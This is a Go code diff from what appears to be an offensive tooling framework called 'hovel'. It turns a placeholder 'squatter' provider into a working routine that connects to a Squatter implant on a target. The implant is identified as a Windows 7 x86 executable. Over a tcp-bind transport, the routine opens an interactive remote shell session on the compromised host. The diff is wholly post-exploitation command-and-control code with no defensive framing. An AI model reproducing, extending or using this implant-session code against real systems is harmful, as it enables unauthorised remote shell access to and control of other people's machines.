@@ -11,6 +11,7 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"path/filepath"
@@ -18,6 +19,7 @@ import (
 	"strings"
 	"unicode/utf16"
 
+	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/shell"
 	"github.com/Vibe-Pwners/hovel/sdk/go/hovel"
 )
 
@@ -96,12 +98,74 @@ func enumReq(key, description string, allowed ...string) hovel.Requirement {
 	return req
 }
 
-func (Provider) Run(ctx *hovel.Context) (hovel.Result, error) {
-	ctx.Log.Info("squatter provider execute placeholder", "target", ctx.Target)
-	return hovel.Ok(
-		map[string]any{"status": "provider lifecycle is not wired into throws yet"},
-		hovel.WithSummary("squatter provider placeholder completed"),
-	), nil
+func (p Provider) Run(ctx *hovel.Context) (hovel.Result, error) {
+	config := stringConfigFromContext(ctx)
+	if config["payload.transport"] == "" {
+		config["payload.transport"] = tcpBind
+	}
+	transport := canonicalTransport(config["payload.transport"])
+	target := firstNonEmpty(config["target.host"], ctx.Target)
+	ctx.Log.Info("connecting to Squatter session", "target", target, "transport", transport)
+	lp := p.listeningPost()
+	session, err := lp.ConnectSession(hovel.ConnectSessionRequest{
+		RunID:     ctx.RunID,
+		Target:    target,
+		PayloadID: "squatter/windows/x86/windows-7/" + transport + "/pe-exe",
+		Config:    config,
+	})
+	if err != nil {
+		ctx.Log.Warn("Squatter session connection failed", "target", target, "error", err.Error())
+		return hovel.Failed(
+			"Squatter installed but session connection failed",
+			hovel.WithFindings(hovel.Finding{
+				Title:    "Squatter session connection failed",
+				Severity: "high",
+				Detail:   err.Error(),
+			}),
+		), nil
+	}
+	result := hovel.Ok(
+		map[string]any{"target": target, "sessionId": session.ID, "transport": session.Transport},
+		hovel.WithSummary("Squatter session connected"),
+	)
+	if transport == tcpBind {
+		if placeholder, ok := lp.(*placeholderLP); ok {
+			if conn, ok := placeholder.tcpBindConn(target); ok {
+				ref, err := ctx.OpenSession(
+					&hovel.PTYSession{Frontend: func(input io.Reader, output io.Writer) error {
+						shell.New(conn).Run(input, output)
+						return nil
+					}},
+					hovel.WithName("Squatter session"),
+					hovel.WithKind("agent"),
+					hovel.WithTransport("squatter/tcp-bind"),
+					hovel.WithCapabilities(capabilities()...),
+				)
+				if err != nil {
+					return hovel.Result{}, err
+				}
+				result.Sessions = append(result.Sessions, ref)
+				return result, nil
+			}
+		}
+	}
+	result.Sessions = append(result.Sessions, session)
+	return result, nil
+}
+
+func stringConfigFromContext(ctx *hovel.Context) map[string]string {
+	config := map[string]string{}
+	for key, value := range ctx.ChainConfig {
+		if text, ok := value.(string); ok {
+			config[key] = text
+		}
+	}
+	for key, value := range ctx.TargetConfig {
+		if text, ok := value.(string); ok {
+			config[key] = text
+		}
+	}
+	return config
 }
 
 func (Provider) DescribeSteps() (hovel.StepContractSet, error) {
